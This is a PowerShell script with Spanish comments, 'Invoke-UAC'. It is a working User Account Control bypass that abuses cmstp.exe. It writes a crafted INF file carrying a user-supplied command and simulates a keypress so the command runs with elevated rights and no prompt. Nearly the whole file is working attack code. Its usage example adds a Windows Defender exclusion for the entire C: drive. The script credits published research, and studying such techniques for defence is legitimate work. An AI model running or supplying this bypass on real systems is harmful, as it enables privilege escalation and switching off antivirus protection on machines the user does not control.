function Invoke-UAC
{

<#
 
.SYNOPSIS

Este script sirve para hacer un bypass de uac (Control de cuentas de usuario) en un windows donde el usuario actual este dentro del grupo de administradores y la seguridad de uac se encuentre por defecto, en el caso contrario, si el usuario tiene la configuracion de que uac le avise siempre de cualquier movimiento o en la seguridad maxima, le avisara de cualquier manera y este bypass no funcionara.

.DESCRIPTION

Este script usa codigo en C# para ser cargado en la memoria con Powershell usando reflection, luego es invocada la funcion Execute del codigo de C# cargado, el cual ejecutara el comando que le demos en altos privilegios (administrador)

.PARAMETER Executable


.PARAMETER Command


.EXAMPLE

Ejecutar Invoke-UAC abriendo powershell con un comando que añade una exclusion a Windows Defender.
Invoke-UAC -Executable "powershell" -Command "Add-MpPreference -ExclusionPath C:\"

.EXAMPLE

Ejecutar Invoke-UAC abriendo una cmd (a la vista) que estara elevada
Invoke-UAC -Executable "cmd"

.NOTES

Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html
#>


 param(
     [Parameter()]
     [string]$Executable,
 
     [Parameter()]
     [string]$Command

 )

    if (![System.IO.File]::Exists($Executable)) {
        $Executable =  (Get-Command $Executable).Source
         if (![System.IO.File]::Exists($Executable)) {
                Write-Host "[!] Ejecutable no encontrado"
                exit
         }
    }
    
    if ($Executable -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe") 
    {
        if ($Command -ne "") {
            $final = "powershell -c ""$Command"""
        } else {
            $final =  "$Executable $Command"
        }
 
    } elseif  ($Executable -eq "C:\Windows\system32\cmd.exe") 
    {
        if ($Command -ne "") 
        {
            $final = "cmd /c ""$Command"""
        } else {
            $final =  "$Executable $Command"
        }

    } else 
    {
        
        $final =  "$Executable $Command"
    
    }

$sign = '$chicago$'
$code = @"
using System;
using System.Threading;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Windows;
using System.Runtime.InteropServices;

public class CMSTPBypass
{
 
     public static string InfData = @"[version]
Signature=$sign
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""

";
    
    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 

    [DllImport("user32.dll")]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);


    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    public static string SetInfFile(string CommandToExecute)
    {
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append("C:\\windows\\temp");
        OutputFile.Append("\\");
        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool Execute(string CommandToExecute)
    {

        const int WM_SYSKEYDOWN = 0x0100;
        const int VK_RETURN = 0x0D;


        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute));

        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        IntPtr dptr = Marshal.AllocHGlobal(1); 
        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);

        Thread.Sleep(5000);
        IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel

        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
        return true;
    }


}
"@

function Execute {
    try 
    {
        $result = [CMSTPBypass]::Execute($final) 
    } 
    catch 
    {
        Add-Type $code
        $result = [CMSTPBypass]::Execute($final) 
    }

    if ($result) {
        Write-Output "[*] Elevacion exitosa"
    } 
    else {
        Write-Output "[!] Ocurrio un error"
    }
}

$process =  ((Get-WmiObject -Class win32_process).name  | Select-String "cmstp" |  Select-Object * -First 1).Pattern
if ($process -eq "cmstp") {
    try 
    {
         Stop-Process -Name "cmstp"
         Execute
    }
    catch 
    {
        Write-Host "[!] Error en la ejecucion de Invoke-UAC, intente cerrar el proceso cmstp.exe"
    }
} 
else {
    Execute
}
}
